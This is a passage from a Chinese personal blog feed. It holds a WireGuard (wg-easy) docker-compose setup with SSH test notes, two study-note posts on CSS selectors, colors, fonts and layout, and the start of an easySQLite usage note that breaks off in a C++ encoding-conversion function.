<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">wg-easy:</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WG_HOST=x.x.x.x</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">PASSWORD=xxxx</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WG_PERSISTENT_KEEPALIVE=15</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WG_MTU=1420</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WG_DEFAULT_ADDRESS=192.168.3.x</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">WG_ALLOWED_IPS=192.168.3.0/24</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">myHarbor/sonui/wg-easy</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">wg-easy</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">wg-easy</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./data:/etc/wireguard</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;51820:51820/udp&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;127.0.0.1:51821:51821&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">cap_add:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">NET_ADMIN</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SYS_MODULE</span></span><br><span class="line">    <span class="attr">sysctls:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">net.ipv4.ip_forward=1</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">net.ipv4.conf.all.src_valid_mark=1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>注：如果选择 Podman 作为容器运行时会出现无法连通的问题，猜测需要配置网络</li>
</ul>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>对各设备分配固定 IP 及配置启动后控制面板如下</p>
<p><img src="/./WireGuard%20Use%20Notes/device%20list.png" alt="device list" loading="lazy"></p>
<p>在 MacBook 上配置好 SSH config</p>
<p><img src="/./WireGuard%20Use%20Notes/SSH%20config.png" alt="SSH config" loading="lazy"></p>
<p><code>ssh dev</code> 连接到家庭网络的开发机，查看 session 信息</p>
<p><img src="/./WireGuard%20Use%20Notes/ssh%20session%20info.png" alt="ssh session info" loading="lazy"></p>
<p>连接成功，可以看到 IP 地址是 <code>192.168.3.7</code>，说明<br> wg 组网成功</p>
]]></content>
      <tags>
        <tag>wg, 异地组网, 网络</tag>
      </tags>
  </entry>
  <entry>
    <title>理解CSS</title>
    <url>//css-study-1/</url>
    <content><![CDATA[<p>字节青训营学习笔记 - CSS</p>
<span id="more"></span>

<h2 id="CSS是什么"><a href="#CSS是什么" class="headerlink" title="CSS是什么"></a>CSS是什么</h2><p>介绍:</p>
<p>CSS(Cascading Style Sheets)是一种用来定义HTML页面的样式的语言</p>
<p>通过其我们可以</p>
<ul>
<li><p>设置字体和颜色</p>
</li>
<li><p>设置位置和大小</p>
</li>
<li><p>添加动画效果</p>
</li>
<li><p>为不同的设备适配不同的样式</p>
</li>
</ul>
<h2 id="使用CSS"><a href="#使用CSS" class="headerlink" title="使用CSS"></a>使用CSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 外链 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 多个页面通用时使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 嵌入 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 单页面内多个元素通用时使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 内联 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 单个元素设置特殊样式时使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: #46A59A;&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A(加载HTML)--&gt;B(解析HTML)--&gt;C(创建DOM树)--&gt;D(展示页面)</span><br><span class="line">B--&gt;E(加载CSS)--&gt;F(解析CSS)--&gt;G(添加样式到DOM节点)--&gt;C</span><br></pre></td></tr></table></figure>

<h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>三种方式</p>
<ul>
<li><p>标签名、类名或ID</p>
</li>
<li><p>属性</p>
</li>
<li><p>DOM树中的位置</p>
</li>
</ul>
<p>还有一个特殊的选择器: <code>*</code> 统配选择器, 可以选择所有元素</p>
<p>选择器实例</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* id选择器 */</span></span><br><span class="line"><span class="selector-id">#id</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 类名选择器 */</span></span><br><span class="line"><span class="selector-class">.class</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 标签选择器 */</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 属性选择器 */</span></span><br><span class="line"><span class="comment">/* 匹配 &lt;input disable/&gt; */</span></span><br><span class="line"><span class="selector-attr">[disabled]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[disabled]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* herf以#开头 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href^=<span class="string">&quot;#&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* herf以.jpg结尾 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href$=<span class="string">&quot;.jpg&quot;</span>]</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h2><p>当元素属于某个状态时, 可以使用伪类</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 默认状态 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:link</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#46A59A</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 点击之后 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:visited</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#46A59A</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标移入 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#46A59A</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 鼠标离开 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 被选中 */</span></span><br><span class="line"><span class="selector-pseudo">:focus</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 结构伪类 */</span></span><br><span class="line"><span class="comment">/* 第一个子元素 */</span></span><br><span class="line"><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 最后一个 */</span></span><br><span class="line"><span class="selector-pseudo">:last-child</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="组合-重点"><a href="#组合-重点" class="headerlink" title="组合(重点)"></a>组合(<font color="red">重点</font>)</h2><table>
<thead>
<tr>
<th>名称</th>
<th>语法</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>直接组合</td>
<td>AB</td>
<td>满足A同时也满足B</td>
<td><code>input:focus</code></td>
</tr>
<tr>
<td>后代组合</td>
<td>A B</td>
<td>选择A的子孙B</td>
<td><code>div a</code></td>
</tr>
<tr>
<td>亲子组合</td>
<td>A&gt;B</td>
<td>选择A的子元素B</td>
<td><code>div&gt;a</code></td>
</tr>
<tr>
<td>兄弟选择器</td>
<td>A~B</td>
<td>如果B在A后且同级则选择它</td>
<td><code>a~img</code></td>
</tr>
<tr>
<td>相邻选择器</td>
<td>A+B</td>
<td>如果B紧跟在A后则选择它</td>
<td><code>a+img</code></td>
</tr>
</tbody></table>
<p>当选择多个时, 通过 <code>,</code> 隔开, 称为选择器组</p>
<h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><p>三原色</p>
<ul>
<li>R: red</li>
<li>G: green</li>
<li>B: blue</li>
</ul>
<p>通过三色可以设置颜色, 数值从0-255</p>
<p><code>#8fac87</code> 与 <code>rgb(143, 172, 135)</code> 为两种设置颜色的方法，前者为后者三色的值转为16进制后拼接</p>
<h3 id="HSL"><a href="#HSL" class="headerlink" title="HSL"></a>HSL</h3><p>通过三方面来区分颜色</p>
<ul>
<li>Hue: 色调 颜色(0-360)</li>
<li>Saturation: 饱和度 越高越鲜艳(0-100)</li>
<li>Lightness: 亮度 越高颜色越亮(0-100)</li>
</ul>
<p>使用方式: <code>hsl(0, 100%, 50%)</code></p>
<h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p><code>rgba(255, 0, 0, 0.5)</code>: 透明度为50%的红色</p>
<p><code>hsla(0, 100%, 50%, 0.6)</code>: 透明度为60%的红色</p>
<p><code>#ff0000ff</code>: 透明度为255的红色</p>
<h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 字体族 */</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="comment">/* 从前往后匹配直到遇到拥有的字体 */</span></span><br><span class="line">    <span class="comment">/* sans-serif 为通用字体 无衬线 一定要在最后加一个通用字体族*/</span></span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;Helvetica Neue&quot;</span>, Helvetica, Arial, sans-serif;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="使用网络字体"><a href="#使用网络字体" class="headerlink" title="使用网络字体"></a>使用网络字体</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="keyword">@font-face</span>&#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;MyFont&quot;</span>;</span><br><span class="line">    <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&quot;http://example.com/font.woff&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&quot;MyFont&quot;</span>, sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><p>大小:</p>
<p><code>font-size</code>: <code>&lt;font-size&gt;</code> 字体大小</p>
<p><code>font-size</code> 可以是一个数值加单位, 如 <code>px</code>, <code>em</code>, <code>rem</code></p>
<p>样式:</p>
<p><code>font-style</code>: <code>&lt;font-style&gt;</code> 字体样式</p>
<ul>
<li><code>normal</code>: 正常</li>
<li><code>italic</code>: 斜体</li>
<li><code>oblique</code>: 倾斜</li>
<li><code>initial</code>: 初始值</li>
<li><code>inherit</code>: 继承</li>
</ul>
<p>字重:</p>
<p><code>font-weight</code>: <code>&lt;font-weight&gt;</code> 字体重量, 数值越大越粗</p>
<p>行高:</p>
<p>设置两行文字之间的间距</p>
<p><code>line-height</code>: <code>&lt;line-height&gt;</code> 行高</p>
<p>组合设置:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="comment">/* 斜体 粗细 大小/行高 字体族*/</span></span><br><span class="line">    <span class="attribute">font</span>: italic bold <span class="number">1.5em</span>/<span class="number">1.7</span> <span class="string">&quot;Helvetica Neue&quot;</span>, Helvetica, Arial, sans-serif;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对齐:</p>
<p><code>text-align</code>: <code>&lt;text-align&gt;</code> 文字对齐</p>
<ul>
<li><code>left</code>: 左对齐</li>
<li><code>right</code>: 右对齐</li>
<li><code>center</code>: 居中</li>
<li><code>justify</code>: 两端对齐</li>
<li><code>initial</code>: 初始值</li>
</ul>
<p>间距:</p>
<p><code>letter-spacing</code>: <code>&lt;letter-spacing&gt;</code> 字符间距</p>
<p><code>word-spacing</code>: <code>&lt;word-spacing&gt;</code> 单词间距</p>
<p>首行缩进:</p>
<p><code>text-indent</code>: <code>&lt;text-indent&gt;</code> 首行缩进</p>
<p>文字修饰:</p>
<p><code>text-decoration</code>: <code>&lt;text-decoration&gt;</code> 文字修饰</p>
<ul>
<li><code>none</code>: 无修饰</li>
<li><code>underline</code>: 下划线</li>
<li><code>overline</code>: 上划线</li>
<li><code>line-through</code>: 删除线</li>
<li><code>initial</code>: 初始值</li>
<li><code>inherit</code>: 继承</li>
</ul>
<p>不可见字符处理:</p>
<p><code>white-space</code>: <code>&lt;white-space&gt;</code> 不可见字符处理</p>
<ul>
<li><code>normal</code>: 正常</li>
<li><code>nowrap</code>: 不换行</li>
<li><code>pre</code>: 单词首字母紧靠</li>
<li><code>pre-wrap</code>: 单词首字母紧靠, 其他字符换行</li>
<li><code>pre-line</code>: 单词首字母紧靠, 其他字符不换行</li>
<li><code>initial</code>: 初始值</li>
<li><code>inherit</code>: 继承</li>
</ul>
]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>深入CSS</title>
    <url>//css-study-2/</url>
    <content><![CDATA[<p>字节青训营学习笔记 - CSS 2</p>
<span id="more"></span>

<h2 id="特异度"><a href="#特异度" class="headerlink" title="特异度"></a>特异度</h2><p>随着特异度程度越高，优先级越高</p>
<h3 id="特异度计算"><a href="#特异度计算" class="headerlink" title="特异度计算"></a>特异度计算</h3><p><code>#nav .list li ac:link</code>: 1个ID, 两个(伪)类, 2个标签</p>
<p><code>.hd ul .links a</code>: 0个ID, 2个(伪)类, 2个标签</p>
<h2 id="选择器语法"><a href="#选择器语法" class="headerlink" title="选择器语法"></a>选择器语法</h2><p>通过选择器复用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>普通按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;btn primary&quot;</span>&gt;</span>主要按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.btn</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">36em</span> .<span class="number">8em</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-right</span>: .<span class="number">5em</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: .<span class="number">3em</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#e6e6e6</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.btn</span><span class="selector-class">.primary</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#218de6</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>某些属性会自动继承父元素的属性, 除非显性指定一个值</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">box-sizing</span>: inherit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.some-widget</span> &#123;</span><br><span class="line">    <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="值"><a href="#值" class="headerlink" title="值"></a>值</h2><p>CSS中, 每个属性都用一个初始值</p>
<ul>
<li><code>background-color</code> 的初始值为 <code>transparent</code></li>
<li><code>color</code> 的初始值为 <code>inherit</code></li>
<li><code>margin</code> 的初始值为 <code>0</code></li>
</ul>
<p>可以使用 <code>initial</code> 关键字显示的重置为初始值</p>
<ul>
<li><code>background-color: initial</code></li>
</ul>
<h3 id="求值过程"><a href="#求值过程" class="headerlink" title="求值过程"></a>求值过程</h3><blockquote>
<p><a href="https://cdpn.io/webzhao/debug/xxXyzRd">求值过程</a><br>存档: <a href="https://web.archive.org/web/20220725134302/https://cdpn.io/webzhao/debug/xxXyzRd">求值过程</a></p>
</blockquote>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>作用</p>
<ul>
<li>确定内容的大小和位置</li>
<li>依据元素、容器、兄弟节点和内容等信息来计算位置</li>
</ul>
<h3 id="布局类型"><a href="#布局类型" class="headerlink" title="布局类型"></a>布局类型</h3><p>常规布局</p>
<ul>
<li>行级</li>
<li>块级</li>
<li>表格布局</li>
<li>FlexBox</li>
<li>Grid布局</li>
</ul>
<h3 id="盒型布局"><a href="#盒型布局" class="headerlink" title="盒型布局"></a>盒型布局</h3><ul>
<li>margin: 外边距</li>
<li>border: 边框</li>
<li>padding: 内边距</li>
<li>width: 宽度</li>
<li>height: 高度</li>
</ul>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bd549d712fec475eacae23e934dc0ccb~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy"></p>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f260d9480e81488fbccc9bce94c345b2~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy"></p>
<table>
<thead>
<tr>
<th>属性</th>
<th>取值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>width</code></td>
<td>长度、百分数、auto(默认值为 <code>auto</code>)</td>
<td>宽度</td>
</tr>
<tr>
<td><code>height</code></td>
<td>长度、百分数、auto(默认值为 <code>auto</code>)</td>
<td>高度</td>
</tr>
<tr>
<td><code>margin</code></td>
<td>长度、百分数、auto(默认值为 <code>0</code>)</td>
<td>外边距</td>
</tr>
<tr>
<td><code>padding</code></td>
<td>长度、百分数、auto(默认值为 <code>0</code>)</td>
<td>内边距</td>
</tr>
<tr>
<td><code>border</code></td>
<td>三种属性: <code>border-width</code>, <code>border-style</code>, <code>border-color</code>, 四个方向: <code>border-top</code>, <code>border-right</code>, <code>border-bottom</code>, <code>border-left</code></td>
<td>边框</td>
</tr>
</tbody></table>
<p><strong>特殊</strong><br><code>margin</code> 可设置为 <code>auto</code> 使元素居中<br><code>box-sizing</code> 设置是否需要加上内边距(padding)和边框等<br><code>overflow</code> 当元素溢出时如何处理, 其取值可为</p>
<ul>
<li>visible: 可见</li>
<li>hidden: 隐藏</li>
<li>scroll: 滚动</li>
</ul>
<h2 id="块级-vs-行级"><a href="#块级-vs-行级" class="headerlink" title="块级 vs 行级"></a>块级 vs 行级</h2><table>
<thead>
<tr>
<th>块级</th>
<th>行级</th>
</tr>
</thead>
<tbody><tr>
<td>不和其它盒子并列摆放</td>
<td>和其它盒子一起放一行或拆开成多行</td>
</tr>
<tr>
<td>可以放置多个盒子</td>
<td>盒模型中的width、height不适用</td>
</tr>
<tr>
<td>生成块级盒子</td>
<td>生成行级盒子 内容分散在多个行盒中</td>
</tr>
<tr>
<td>body, article, div, h1-h6</td>
<td>span, em, code</td>
</tr>
<tr>
<td>display: block</td>
<td>display: inline</td>
</tr>
</tbody></table>
<p><strong>display 属性</strong></p>
<table>
<thead>
<tr>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>block</code></td>
<td>块级元素</td>
</tr>
<tr>
<td><code>inline</code></td>
<td>内联元素</td>
</tr>
<tr>
<td><code>inline-block</code></td>
<td>内联元素块级元素</td>
</tr>
<tr>
<td><code>none</code></td>
<td>排版时忽略</td>
</tr>
</tbody></table>
<h2 id="常规流"><a href="#常规流" class="headerlink" title="常规流"></a>常规流</h2><h3 id="行级"><a href="#行级" class="headerlink" title="行级"></a>行级</h3><p><code>Inline Formatting Context</code>(<code>IFC</code>)<br>当只包含行级盒子的容器会创建一个<code>IFC</code></p>
<p><code>IFC</code> 内的排版规则</p>
<ul>
<li>盒子在一行内水平排列</li>
<li>一行放不下时, 换行显示</li>
<li><code>text-align</code> 决定一行内盒子的水平对齐</li>
<li><code>vertical-align</code> 决定一个盒子在行内的垂直对齐</li>
<li><em><strong>避开浮动(floar)元素</strong></em></li>
</ul>
<h3 id="块级"><a href="#块级" class="headerlink" title="块级"></a>块级</h3><p><code>Block Formatting Context</code>(<code>BFC</code>)<br>某些容器会创建一个<code>BFC</code><br>例如:</p>
<ul>
<li>根元素</li>
<li>浮动, 绝对定位, inline-block</li>
<li>Flex子项Grid子项</li>
<li>overflow 值不是visible的块盒</li>
<li><code>display: flow-root</code></li>
</ul>
<p><code>BFC</code> 内的排版规则</p>
<ul>
<li>盒子从上到下摆放</li>
<li>垂直 margin 合并</li>
<li><code>BFC</code> 内盒子的margin不会与外面的合并</li>
<li><code>BFC</code> 不会盒浮动元素重叠</li>
</ul>
<h2 id="Flex布局"><a href="#Flex布局" class="headerlink" title="Flex布局"></a>Flex布局</h2><p>Flex布局阮一峰老师总结的就很好理解, 一篇足以</p>
<p><a href="https://www.w3schools.com/cssref/css3_pr_flex.asp">Flex 布局教程</a></p>
<h2 id="Grid布局"><a href="#Grid布局" class="headerlink" title="Grid布局"></a>Grid布局</h2><p><code>display: grid</code>会创建一个块级的Grid容器, 可以以此来实现磁贴<br>也同样推荐阮一峰老师的总结</p>
<p><a href="http://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html">CSS Grid 网格布局教程</a></p>
<h2 id="Float浮动"><a href="#Float浮动" class="headerlink" title="Float浮动"></a>Float浮动</h2><p>可以实现图片环绕的效果</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">      <span class="attr">src</span>=<span class="string">&quot;https:/ / p4.ssl.qhimg.com/t017aec0e7edc961740.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span>&quot;<span class="attr">alt</span>=<span class="string">&quot;mojave&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>莫哈韦沙漠不仅纬度较高，而且温度要稍微低些，是命名该公园的短叶丝兰—约书亚树的特殊栖息地。约书亚树以从茂密的森林到远远间隔的实例等各种形式出现。除了约书亚树森林之外，该公园的西部包括加州沙漠里发现的最有趣的地质外观。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">img</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>效果图</p>
<p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/43f05e255f0a4c538194d0c8fa938038~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy"></p>
<p>其它的无需了解</p>
<p>position 属性值</p>
<ul>
<li>static: 默认值, 没有浮动</li>
<li>relative: 相对定位, 可以使用left, top, right, bottom来定位, 不影响其它元素的排版</li>
<li>absolute: 绝对定位, 脱离常规流, 可以使用left, top, right, bottom来定位, 其它元素当没有它</li>
<li>fixed: 固定定位, 可以使用left, top, right, bottom来定位, 可用来做导航条、回到顶部等</li>
<li>sticky: 粘性定位, 元素根据正常文档流进行定位，然后相对它的最近滚动祖先和最近块级祖先，包括 table-related 元素，基于top, right, bottom, 和 left的值进行偏移。偏移值不会影响任何其他元素的位置。</li>
</ul>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position">详细说明</a></p>
]]></content>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>easySQLite使用笔记</title>
    <url>//easySQLite-use-note/</url>
    <content><![CDATA[<p>由于在开发酷Q机器人时需要用到SQLite，所以找到了easySQLite，这是一个简单的SQLite封装库，使用起来比较方便，但是文档不够详细，所以在这里做一些补充</p>
<span id="more"></span>

<blockquote>
<p>easySQLite地址：<a href="https://code.google.com/archive/p/easysqlite/">https://code.google.com/archive/p/easysqlite/</a></p>
</blockquote>
<p>由于需要用到SQLite，经过一番兜兜转转，看到了easySQLite，下载下来，还不错，就是有些地方说明不够详细，以此做补充</p>
<h2 id="打开数据库"><a href="#打开数据库" class="headerlink" title="打开数据库"></a>打开数据库</h2><p>使用时提示 “Database::open: unable to open database file”，可能是因为fileName编码不正确，因为此处要求ut8编码，尝试在前头加上 u8，例如：<code>db.open(u8&quot;D:/中文文件夹名/test.db&quot;);</code>, 或对fileName进行转码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gbk转UTF-8</span></span><br><span class="line"><span class="function">string <span class="title">GbkToUtf8</span><span class="params">(<span class="type">const</span> std::string&amp; strGbk)</span><span class="comment">//传入的strGbk是GBK编码</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//gbk转unicode</span></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, strGbk.<span class="built_in">c_str</span>(), <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">wchar_t</span> *strUnicode = <span class="keyword">new</span> <span class="type">wchar_t</span>[len];</span><br><span class="line">    <span 